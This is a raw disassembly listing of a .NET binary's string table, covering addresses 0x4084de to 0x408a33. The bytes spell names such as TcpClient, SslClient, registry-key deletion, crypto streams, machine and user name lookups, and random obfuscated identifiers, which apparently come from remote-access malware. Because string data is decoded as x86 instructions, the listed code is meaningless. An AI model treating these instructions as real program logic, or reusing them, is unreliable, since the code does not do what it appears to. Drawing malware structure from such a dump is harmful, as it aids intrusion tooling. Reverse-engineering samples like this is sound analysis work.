  4084de:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4084e3:	61                   	popa
  4084e4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e8:	67 46                	addr16 inc %esi
  4084ea:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  4084f1:	75 66                	jne    0x408559
  4084f3:	66 65 72 3e          	data16 gs jb 0x408535
  4084f7:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4084fb:	61                   	popa
  4084fc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408500:	67 46                	addr16 inc %esi
  408502:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  408509:	66 66 73 65          	data16 data16 jae 0x408572
  40850d:	74 3e                	je     0x40854d
  40850f:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408513:	61                   	popa
  408514:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408517:	6e                   	outsb  %ds:(%esi),(%dx)
  408518:	67 46                	addr16 inc %esi
  40851a:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  408521:	73 6c                	jae    0x40858f
  408523:	43                   	inc    %ebx
  408524:	6c                   	insb   (%dx),%es:(%edi)
  408525:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  40852c:	5f                   	pop    %edi
  40852d:	42                   	inc    %edx
  40852e:	61                   	popa
  40852f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408532:	6e                   	outsb  %ds:(%esi),(%dx)
  408533:	67 46                	addr16 inc %esi
  408535:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  40853c:	63 70 43             	arpl   %esi,0x43(%eax)
  40853f:	6c                   	insb   (%dx),%es:(%edi)
  408540:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408547:	5f                   	pop    %edi
  408548:	42                   	inc    %edx
  408549:	61                   	popa
  40854a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40854d:	6e                   	outsb  %ds:(%esi),(%dx)
  40854e:	67 46                	addr16 inc %esi
  408550:	69 65 6c 64 00 77 46 	imul   $0x46770064,0x6c(%ebp),%esp
  408557:	51                   	push   %ecx
  408558:	43                   	inc    %ebx
  408559:	41                   	inc    %ecx
  40855a:	69 56 76 77 4b 61 71 	imul   $0x71614b77,0x76(%esi),%edx
  408561:	55                   	push   %ebp
  408562:	6e                   	outsb  %ds:(%esi),(%dx)
  408563:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  408567:	70 65                	jo     0x4085ce
  408569:	6e                   	outsb  %ds:(%esi),(%dx)
  40856a:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  40856e:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  408575:	61 
  408576:	6c                   	insb   (%dx),%es:(%edi)
  408577:	75 65                	jne    0x4085de
  408579:	4b                   	dec    %ebx
  40857a:	69 6e 64 00 42 71 67 	imul   $0x67714200,0x64(%esi),%ebp
  408581:	64 53                	fs push %ebx
  408583:	45                   	inc    %ebp
  408584:	70 62                	jo     0x4085e8
  408586:	6b 6e 64 00          	imul   $0x0,0x64(%esi),%ebp
  40858a:	43                   	inc    %ebx
  40858b:	77 5a                	ja     0x4085e7
  40858d:	6f                   	outsl  %ds:(%esi),(%dx)
  40858e:	4a                   	dec    %edx
  40858f:	62 50 75             	bound  %edx,0x75(%eax)
  408592:	4a                   	dec    %edx
  408593:	4b                   	dec    %ebx
  408594:	4e                   	dec    %esi
  408595:	65 4e                	gs dec %esi
  408597:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  40859b:	47                   	inc    %edi
  40859c:	75 43                	jne    0x4085e1
  40859e:	76 4d                	jbe    0x4085ed
  4085a0:	48                   	dec    %eax
  4085a1:	66 44                	inc    %sp
  4085a3:	42                   	inc    %edx
  4085a4:	6b 68 75 62          	imul   $0x62,0x75(%eax),%ebp
  4085a8:	53                   	push   %ebx
  4085a9:	65 00 6b 59          	add    %ch,%gs:0x59(%ebx)
  4085ad:	45                   	inc    %ebp
  4085ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4085af:	4d                   	dec    %ebp
  4085b0:	6a 42                	push   $0x42
  4085b2:	62 4d 78             	bound  %ecx,0x78(%ebp)
  4085b5:	77 72                	ja     0x408629
  4085b7:	6d                   	insl   (%dx),%es:(%edi)
  4085b8:	54                   	push   %esp
  4085b9:	65 00 63 72          	add    %ah,%gs:0x72(%ebx)
  4085bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4085be:	69 43 44 67 4e 55 65 	imul   $0x65554e67,0x44(%ebx),%eax
  4085c5:	55                   	push   %ebp
  4085c6:	65 00 73 55          	add    %dh,%gs:0x55(%ebx)
  4085ca:	7a 45                	jp     0x408611
  4085cc:	51                   	push   %ecx
  4085cd:	66 4a                	dec    %dx
  4085cf:	50                   	push   %eax
  4085d0:	73 56                	jae    0x408628
  4085d2:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4085d6:	70 6c                	jo     0x408644
  4085d8:	61                   	popa
  4085d9:	63 65 00             	arpl   %esp,0x0(%ebp)
  4085dc:	43                   	inc    %ebx
  4085dd:	72 65                	jb     0x408644
  4085df:	61                   	popa
  4085e0:	74 65                	je     0x408647
  4085e2:	49                   	dec    %ecx
  4085e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e4:	73 74                	jae    0x40865a
  4085e6:	61                   	popa
  4085e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e8:	63 65 00             	arpl   %esp,0x0(%ebp)
  4085eb:	4e                   	dec    %esi
  4085ec:	4e                   	dec    %esi
  4085ed:	4b                   	dec    %ebx
  4085ee:	45                   	inc    %ebp
  4085ef:	5a                   	pop    %edx
  4085f0:	42                   	inc    %edx
  4085f1:	51                   	push   %ecx
  4085f2:	54                   	push   %esp
  4085f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4085f4:	78 47                	js     0x40863d
  4085f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f7:	65 48                	gs dec %eax
  4085f9:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  4085fe:	74 5f                	je     0x40865f
  408600:	4d                   	dec    %ebp
  408601:	6f                   	outsl  %ds:(%esi),(%dx)
  408602:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  408607:	6c                   	insb   (%dx),%es:(%edi)
  408608:	65 4d                	gs dec %ebp
  40860a:	6f                   	outsl  %ds:(%esi),(%dx)
  40860b:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  408610:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  408617:	64 65 
  408619:	00 45 6e             	add    %al,0x6e(%ebp)
  40861c:	74 65                	je     0x408683
  40861e:	72 44                	jb     0x408664
  408620:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408624:	4d                   	dec    %ebp
  408625:	6f                   	outsl  %ds:(%esi),(%dx)
  408626:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  40862b:	79 70                	jns    0x40869d
  40862d:	74 6f                	je     0x40869e
  40862f:	53                   	push   %ebx
  408630:	74 72                	je     0x4086a4
  408632:	65 61                	gs popa
  408634:	6d                   	insl   (%dx),%es:(%edi)
  408635:	4d                   	dec    %ebp
  408636:	6f                   	outsl  %ds:(%esi),(%dx)
  408637:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  40863c:	6d                   	insl   (%dx),%es:(%edi)
  40863d:	70 72                	jo     0x4086b1
  40863f:	65 73 73             	gs jae 0x4086b5
  408642:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  408649:	00 43 69             	add    %al,0x69(%ebx)
  40864c:	70 68                	jo     0x4086b6
  40864e:	65 72 4d             	gs jb  0x40869e
  408651:	6f                   	outsl  %ds:(%esi),(%dx)
  408652:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  408657:	6c                   	insb   (%dx),%es:(%edi)
  408658:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  40865d:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  408663:	65 74 65             	gs je  0x4086cb
  408666:	53                   	push   %ebx
  408667:	75 62                	jne    0x4086cb
  408669:	4b                   	dec    %ebx
  40866a:	65 79 54             	gs jns 0x4086c1
  40866d:	72 65                	jb     0x4086d4
  40866f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408673:	74 5f                	je     0x4086d4
  408675:	4d                   	dec    %ebp
  408676:	65 73 73             	gs jae 0x4086ec
  408679:	61                   	popa
  40867a:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  40867f:	76 6f                	jbe    0x4086f0
  408681:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  408685:	45                   	inc    %ebp
  408686:	6e                   	outsb  %ds:(%esi),(%dx)
  408687:	75 6d                	jne    0x4086f6
  408689:	65 72 61             	gs jb  0x4086ed
  40868c:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  408690:	49                   	dec    %ecx
  408691:	44                   	inc    %esp
  408692:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  408699:	6c                   	insb   (%dx),%es:(%edi)
  40869a:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  40869f:	6f                   	outsl  %ds:(%esi),(%dx)
  4086a0:	75 62                	jne    0x408704
  4086a2:	6c                   	insb   (%dx),%es:(%edi)
  4086a3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086a7:	74 5f                	je     0x408708
  4086a9:	48                   	dec    %eax
  4086aa:	61                   	popa
  4086ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4086ac:	64 6c                	fs insb (%dx),%es:(%edi)
  4086ae:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4086b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b3:	74 69                	je     0x40871e
  4086b5:	6d                   	insl   (%dx),%es:(%edi)
  4086b6:	65 46                	gs inc %esi
  4086b8:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  4086bf:	64 6c                	fs insb (%dx),%es:(%edi)
  4086c1:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4086c5:	74 4d                	je     0x408714
  4086c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4086c8:	64 75 6c             	fs jne 0x408737
  4086cb:	65 48                	gs dec %eax
  4086cd:	61                   	popa
  4086ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4086cf:	64 6c                	fs insb (%dx),%es:(%edi)
  4086d1:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4086d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4086d6:	74 69                	je     0x408741
  4086d8:	6d                   	insl   (%dx),%es:(%edi)
  4086d9:	65 54                	gs push %esp
  4086db:	79 70                	jns    0x40874d
  4086dd:	65 48                	gs dec %eax
  4086df:	61                   	popa
  4086e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e1:	64 6c                	fs insb (%dx),%es:(%edi)
  4086e3:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4086e7:	74 54                	je     0x40873d
  4086e9:	79 70                	jns    0x40875b
  4086eb:	65 46                	gs inc %esi
  4086ed:	72 6f                	jb     0x40875e
  4086ef:	6d                   	insl   (%dx),%es:(%edi)
  4086f0:	48                   	dec    %eax
  4086f1:	61                   	popa
  4086f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f3:	64 6c                	fs insb (%dx),%es:(%edi)
  4086f5:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  4086f9:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408700:	65 
  408701:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  408705:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  40870c:	69 6c 65 00 74 52 76 	imul   $0x76765274,0x0(%ebp,%eiz,2),%ebp
  408713:	76 
  408714:	56                   	push   %esi
  408715:	6d                   	insl   (%dx),%es:(%edi)
  408716:	73 41                	jae    0x408759
  408718:	6d                   	insl   (%dx),%es:(%edi)
  408719:	6c                   	insb   (%dx),%es:(%edi)
  40871a:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  40871e:	49                   	dec    %ecx
  40871f:	6e                   	outsb  %ds:(%esi),(%dx)
  408720:	52                   	push   %edx
  408721:	6f                   	outsl  %ds:(%esi),(%dx)
  408722:	6c                   	insb   (%dx),%es:(%edi)
  408723:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  408727:	6e                   	outsb  %ds:(%esi),(%dx)
  408728:	64 6f                	outsl  %fs:(%esi),(%dx)
  40872a:	77 73                	ja     0x40879f
  40872c:	42                   	inc    %edx
  40872d:	75 69                	jne    0x408798
  40872f:	6c                   	insb   (%dx),%es:(%edi)
  408730:	74 49                	je     0x40877b
  408732:	6e                   	outsb  %ds:(%esi),(%dx)
  408733:	52                   	push   %edx
  408734:	6f                   	outsl  %ds:(%esi),(%dx)
  408735:	6c                   	insb   (%dx),%es:(%edi)
  408736:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40873a:	74 5f                	je     0x40879b
  40873c:	4d                   	dec    %ebp
  40873d:	61                   	popa
  40873e:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  408745:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408749:	6f                   	outsl  %ds:(%esi),(%dx)
  40874a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40874d:	73 4d                	jae    0x40879c
  40874f:	6f                   	outsl  %ds:(%esi),(%dx)
  408750:	64 75 6c             	fs jne 0x4087bf
  408753:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408757:	74 5f                	je     0x4087b8
  408759:	57                   	push   %edi
  40875a:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408761:	79 6c                	jns    0x4087cf
  408763:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408767:	6f                   	outsl  %ds:(%esi),(%dx)
  408768:	63 65 73             	arpl   %esp,0x73(%ebp)
  40876b:	73 57                	jae    0x4087c4
  40876d:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408774:	79 6c                	jns    0x4087e2
  408776:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40877a:	74 5f                	je     0x4087db
  40877c:	4e                   	dec    %esi
  40877d:	61                   	popa
  40877e:	6d                   	insl   (%dx),%es:(%edi)
  40877f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408783:	74 5f                	je     0x4087e4
  408785:	46                   	inc    %esi
  408786:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40878d:	00 
  40878e:	73 65                	jae    0x4087f5
  408790:	74 5f                	je     0x4087f1
  408792:	46                   	inc    %esi
  408793:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40879a:	00 
  40879b:	47                   	inc    %edi
  40879c:	65 74 54             	gs je  0x4087f3
  40879f:	65 6d                	gs insl (%dx),%es:(%edi)
  4087a1:	70 46                	jo     0x4087e9
  4087a3:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4087aa:	00 
  4087ab:	47                   	inc    %edi
  4087ac:	65 74 46             	gs je  0x4087f5
  4087af:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4087b6:	00 
  4087b7:	67 65 74 5f          	addr16 gs je 0x40881a
  4087bb:	4d                   	dec    %ebp
  4087bc:	61                   	popa
  4087bd:	63 68 69             	arpl   %ebp,0x69(%eax)
  4087c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4087c1:	65 4e                	gs dec %esi
  4087c3:	61                   	popa
  4087c4:	6d                   	insl   (%dx),%es:(%edi)
  4087c5:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087c9:	74 5f                	je     0x40882a
  4087cb:	4f                   	dec    %edi
  4087cc:	53                   	push   %ebx
  4087cd:	46                   	inc    %esi
  4087ce:	75 6c                	jne    0x40883c
  4087d0:	6c                   	insb   (%dx),%es:(%edi)
  4087d1:	4e                   	dec    %esi
  4087d2:	61                   	popa
  4087d3:	6d                   	insl   (%dx),%es:(%edi)
  4087d4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087d8:	74 5f                	je     0x408839
  4087da:	46                   	inc    %esi
  4087db:	75 6c                	jne    0x408849
  4087dd:	6c                   	insb   (%dx),%es:(%edi)
  4087de:	4e                   	dec    %esi
  4087df:	61                   	popa
  4087e0:	6d                   	insl   (%dx),%es:(%edi)
  4087e1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087e5:	74 5f                	je     0x408846
  4087e7:	55                   	push   %ebp
  4087e8:	73 65                	jae    0x40884f
  4087ea:	72 4e                	jb     0x40883a
  4087ec:	61                   	popa
  4087ed:	6d                   	insl   (%dx),%es:(%edi)
  4087ee:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  4087f2:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  4087f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4087f7:	73 74                	jae    0x40886d
  4087f9:	4e                   	dec    %esi
  4087fa:	61                   	popa
  4087fb:	6d                   	insl   (%dx),%es:(%edi)
  4087fc:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  408801:	65 54                	gs push %esp
  408803:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  40880a:	5f                   	pop    %edi
  40880b:	4c                   	dec    %esp
  40880c:	61                   	popa
  40880d:	73 74                	jae    0x408883
  40880f:	57                   	push   %edi
  408810:	72 69                	jb     0x40887b
  408812:	74 65                	je     0x408879
  408814:	54                   	push   %esp
  408815:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  40881c:	6e                   	outsb  %ds:(%esi),(%dx)
  40881d:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  408824:	54                   	push   %esp
  408825:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  40882c:	74 65                	je     0x408893
  40882e:	4c                   	dec    %esp
  40882f:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408836:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408839:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40883d:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408844:	6d                   	insl   (%dx),%es:(%edi)
  408845:	65 54                	gs push %esp
  408847:	79 70                	jns    0x4088b9
  408849:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40884d:	74 5f                	je     0x4088ae
  40884f:	56                   	push   %esi
  408850:	61                   	popa
  408851:	6c                   	insb   (%dx),%es:(%edi)
  408852:	75 65                	jne    0x4088b9
  408854:	54                   	push   %esp
  408855:	79 70                	jns    0x4088c7
  408857:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40885b:	6f                   	outsl  %ds:(%esi),(%dx)
  40885c:	74 6f                	je     0x4088cd
  40885e:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408861:	54                   	push   %esp
  408862:	79 70                	jns    0x4088d4
  408864:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408868:	74 54                	je     0x4088be
  40886a:	79 70                	jns    0x4088dc
  40886c:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408870:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408873:	74 54                	je     0x4088c9
  408875:	79 70                	jns    0x4088e7
  408877:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40887b:	6c                   	insb   (%dx),%es:(%edi)
  40887c:	65 53                	gs push %ebx
  40887e:	68 61 72 65 00       	push   $0x657261
  408883:	53                   	push   %ebx
  408884:	79 73                	jns    0x4088f9
  408886:	74 65                	je     0x4088ed
  408888:	6d                   	insl   (%dx),%es:(%edi)
  408889:	2e 43                	cs inc %ebx
  40888b:	6f                   	outsl  %ds:(%esi),(%dx)
  40888c:	72 65                	jb     0x4088f3
  40888e:	00 4f 43             	add    %cl,0x43(%edi)
  408891:	51                   	push   %ecx
  408892:	57                   	push   %edi
  408893:	77 6d                	ja     0x408902
  408895:	47                   	inc    %edi
  408896:	50                   	push   %eax
  408897:	7a 6f                	jp     0x408908
  408899:	77 6f                	ja     0x40890a
  40889b:	61                   	popa
  40889c:	73 65                	jae    0x408903
  40889e:	00 43 6c             	add    %al,0x6c(%ebx)
  4088a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a2:	73 65                	jae    0x408909
  4088a4:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4088a8:	70 6f                	jo     0x408919
  4088aa:	73 65                	jae    0x408911
  4088ac:	00 4f 67             	add    %cl,0x67(%edi)
  4088af:	63 44 63 4d          	arpl   %eax,0x4d(%ebx,%eiz,2)
  4088b3:	54                   	push   %esp
  4088b4:	50                   	push   %eax
  4088b5:	48                   	dec    %eax
  4088b6:	70 73                	jo     0x40892b
  4088b8:	65 00 50 61          	add    %dl,%gs:0x61(%eax)
  4088bc:	72 73                	jb     0x408931
  4088be:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4088c2:	72 52                	jb     0x408916
  4088c4:	65 76 65             	gs jbe 0x40892c
  4088c7:	72 73                	jb     0x40893c
  4088c9:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4088cd:	30 39                	xor    %bh,(%ecx)
  4088cf:	43                   	inc    %ebx
  4088d0:	65 72 74             	gs jb  0x408947
  4088d3:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4088da:	00 43 72             	add    %al,0x72(%ebx)
  4088dd:	65 61                	gs popa
  4088df:	74 65                	je     0x408946
  4088e1:	00 53 65             	add    %dl,0x65(%ebx)
  4088e4:	74 54                	je     0x40893a
  4088e6:	68 72 65 61 64       	push   $0x64616572
  4088eb:	45                   	inc    %ebp
  4088ec:	78 65                	js     0x408953
  4088ee:	63 75 74             	arpl   %esi,0x74(%ebp)
  4088f1:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4088f8:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4088fd:	65 74 65             	gs je  0x408965
  408900:	00 43 61             	add    %al,0x61(%ebx)
  408903:	6c                   	insb   (%dx),%es:(%edi)
  408904:	6c                   	insb   (%dx),%es:(%edi)
  408905:	53                   	push   %ebx
  408906:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40890d:	74 
  40890e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408912:	6d                   	insl   (%dx),%es:(%edi)
  408913:	70 69                	jo     0x40897e
  408915:	6c                   	insb   (%dx),%es:(%edi)
  408916:	65 72 47             	gs jb  0x408960
  408919:	65 6e                	outsb  %gs:(%esi),(%dx)
  40891b:	65 72 61             	gs jb  0x40897f
  40891e:	74 65                	je     0x408985
  408920:	64 41                	fs inc %ecx
  408922:	74 74                	je     0x408998
  408924:	72 69                	jb     0x40898f
  408926:	62 75 74             	bound  %esi,0x74(%ebp)
  408929:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40892e:	75 67                	jne    0x408997
  408930:	67 61                	addr16 popa
  408932:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408936:	74 74                	je     0x4089ac
  408938:	72 69                	jb     0x4089a3
  40893a:	62 75 74             	bound  %esi,0x74(%ebp)
  40893d:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408941:	6d                   	insl   (%dx),%es:(%edi)
  408942:	56                   	push   %esi
  408943:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40894a:	74 74                	je     0x4089c0
  40894c:	72 69                	jb     0x4089b7
  40894e:	62 75 74             	bound  %esi,0x74(%ebp)
  408951:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408955:	73 65                	jae    0x4089bc
  408957:	6d                   	insl   (%dx),%es:(%edi)
  408958:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40895c:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408963:	72 
  408964:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40896b:	73 73                	jae    0x4089e0
  40896d:	65 6d                	gs insl (%dx),%es:(%edi)
  40896f:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408973:	72 61                	jb     0x4089d6
  408975:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408978:	61                   	popa
  408979:	72 6b                	jb     0x4089e6
  40897b:	41                   	inc    %ecx
  40897c:	74 74                	je     0x4089f2
  40897e:	72 69                	jb     0x4089e9
  408980:	62 75 74             	bound  %esi,0x74(%ebp)
  408983:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408988:	67 65 74 46          	addr16 gs je 0x4089d2
  40898c:	72 61                	jb     0x4089ef
  40898e:	6d                   	insl   (%dx),%es:(%edi)
  40898f:	65 77 6f             	gs ja  0x408a01
  408992:	72 6b                	jb     0x4089ff
  408994:	41                   	inc    %ecx
  408995:	74 74                	je     0x408a0b
  408997:	72 69                	jb     0x408a02
  408999:	62 75 74             	bound  %esi,0x74(%ebp)
  40899c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089a0:	73 65                	jae    0x408a07
  4089a2:	6d                   	insl   (%dx),%es:(%edi)
  4089a3:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4089a7:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4089ae:	69 
  4089af:	6f                   	outsl  %ds:(%esi),(%dx)
  4089b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b1:	41                   	inc    %ecx
  4089b2:	74 74                	je     0x408a28
  4089b4:	72 69                	jb     0x408a1f
  4089b6:	62 75 74             	bound  %esi,0x74(%ebp)
  4089b9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089bd:	73 65                	jae    0x408a24
  4089bf:	6d                   	insl   (%dx),%es:(%edi)
  4089c0:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4089c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c6:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4089cc:	74 69                	je     0x408a37
  4089ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d0:	41                   	inc    %ecx
  4089d1:	74 74                	je     0x408a47
  4089d3:	72 69                	jb     0x408a3e
  4089d5:	62 75 74             	bound  %esi,0x74(%ebp)
  4089d8:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089dc:	73 65                	jae    0x408a43
  4089de:	6d                   	insl   (%dx),%es:(%edi)
  4089df:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4089e3:	65 73 63             	gs jae 0x408a49
  4089e6:	72 69                	jb     0x408a51
  4089e8:	70 74                	jo     0x408a5e
  4089ea:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4089f1:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4089f8:	65 66 61             	gs popaw
  4089fb:	75 6c                	jne    0x408a69
  4089fd:	74 4d                	je     0x408a4c
  4089ff:	65 6d                	gs insl (%dx),%es:(%edi)
  408a01:	62 65 72             	bound  %esp,0x72(%ebp)
  408a04:	41                   	inc    %ecx
  408a05:	74 74                	je     0x408a7b
  408a07:	72 69                	jb     0x408a72
  408a09:	62 75 74             	bound  %esi,0x74(%ebp)
  408a0c:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408a10:	6d                   	insl   (%dx),%es:(%edi)
  408a11:	70 69                	jo     0x408a7c
  408a13:	6c                   	insb   (%dx),%es:(%edi)
  408a14:	61                   	popa
  408a15:	74 69                	je     0x408a80
  408a17:	6f                   	outsl  %ds:(%esi),(%dx)
  408a18:	6e                   	outsb  %ds:(%esi),(%dx)
  408a19:	52                   	push   %edx
  408a1a:	65 6c                	gs insb (%dx),%es:(%edi)
  408a1c:	61                   	popa
  408a1d:	78 61                	js     0x408a80
  408a1f:	74 69                	je     0x408a8a
  408a21:	6f                   	outsl  %ds:(%esi),(%dx)
  408a22:	6e                   	outsb  %ds:(%esi),(%dx)
  408a23:	73 41                	jae    0x408a66
  408a25:	74 74                	je     0x408a9b
  408a27:	72 69                	jb     0x408a92
  408a29:	62 75 74             	bound  %esi,0x74(%ebp)
  408a2c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a30:	73 65                	jae    0x408a97
  408a32:	6d                   	insl   (%dx),%es:(%edi)
  408a33:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
